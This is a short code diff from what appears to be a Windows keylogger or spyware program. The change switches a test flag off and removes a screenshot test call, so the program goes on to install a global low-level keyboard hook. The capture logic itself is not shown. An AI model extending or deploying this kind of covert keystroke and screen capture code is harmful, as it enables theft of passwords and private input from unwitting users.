@@ -57,13 +57,11 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 	return CallNextHookEx(NULL, code, wparam, lparam);
 }
 
-#define test true;
+#define test false;
 
 int main()
 {
 #if test
-
-	takeScreenshot(L"C:\\testscreenshot0102.jpeg");
 
 #else
 	handle_to_hook = SetWindowsHookExA(WH_KEYBOARD_LL, proc, NULL, 0);
